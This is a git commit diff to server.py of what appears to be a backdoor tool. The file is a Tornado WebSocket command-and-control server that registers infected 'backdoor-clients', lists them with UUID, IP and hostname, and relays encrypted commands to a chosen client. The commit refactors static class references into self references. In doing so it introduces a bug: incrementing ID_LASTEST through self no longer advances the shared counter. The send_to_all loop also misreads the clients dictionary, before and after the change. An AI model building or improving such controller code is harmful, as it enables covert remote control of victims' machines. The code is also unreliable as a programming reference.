8ce657967a40645a03d10126de1a911968a48bb7
nekocode <syfyw@qq.com>
2015-10-08 23:36:02 +0800

    use self reference to replace static field

--- server.py
+++ server.py
@@ -19,9 +19,8 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
     def data_received(self, chunk):
         pass
 
-    @staticmethod
-    def send_to_all(message):
-        for key, c in BackdoorSocketHandler.clients:
+    def send_to_all(self, message):
+        for key, c in self.clients:
             c.write_message(json.dumps(message))
 
     def __init__(self, application, request, **kwargs):
@@ -58,13 +57,13 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
                 command = msg['cmd']
                 if command == 'list':
                     data = 'List all online backdoor-clients:\n'
-                    for key, client in BackdoorSocketHandler.clients.items():
+                    for key, client in self.clients.items():
                         data += str(key) + '\t' + client.UUID + '\t' + self.request.remote_ip + '\t' + self.HOST_NAME + '\n'
                     self.send_data(data)
                 elif 'to' in msg:
                     to = int(msg['to'])
-                    if to in BackdoorSocketHandler.clients:
-                        to_client = BackdoorSocketHandler.clients[to]
+                    if to in self.clients:
+                        to_client = self.clients[to]
                         if not to_client == self:
                             to_client.write_message(to_client.encrypt(json_str))
                         self.send_data('OK.\n')
@@ -86,14 +85,14 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
                         self.send_data('login failed')
                         return
 
-                self.ID = BackdoorSocketHandler.ID_LASTEST
-                BackdoorSocketHandler.clients[self.ID] = self
+                self.ID = self.ID_LASTEST
+                self.clients[self.ID] = self
                 print 'find new client: ' + self.request.remote_ip + '(' + self.UUID + ')'
-                BackdoorSocketHandler.ID_LASTEST += 1
+                self.ID_LASTEST += 1
 
     def on_close(self):
-        if self.ID in BackdoorSocketHandler.clients:
-            BackdoorSocketHandler.clients.pop(self.ID)
+        if self.ID in self.clients:
+            self.clients.pop(self.ID)
 
 
 def run_server():
